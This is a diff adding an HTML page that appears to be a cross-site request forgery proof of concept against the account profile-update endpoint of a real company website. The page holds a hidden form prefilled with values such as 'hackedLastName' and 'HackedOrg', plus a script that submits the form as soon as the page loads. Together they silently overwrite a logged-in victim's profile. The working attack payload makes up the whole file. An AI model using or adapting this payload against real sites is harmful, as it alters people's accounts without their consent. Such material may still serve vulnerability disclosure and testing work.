@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <form id="csrfForm" action="https://www.cat.com/content/catdotcom/en_US/account/myaccount/account-information/jcr:content/root/responsivegrid_1010483686/userprofile.updateUserProfile.html" method="POST">
+      <input type="hidden" name="givenname" value="localhosston">
+      <input type="hidden" name="sn" value="hackedLastName">
+      <input type="hidden" name="telephonenumber" value="+1234567890">
+      <input type="hidden" name="c" value="US">
+      <input type="hidden" name="st" value="HackedState">
+      <input type="hidden" name="postalcode" value="00000">
+      <input type="hidden" name="o" value="HackedOrg">
+      <input type="hidden" name="userProfile" value="true">
+    </form>
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
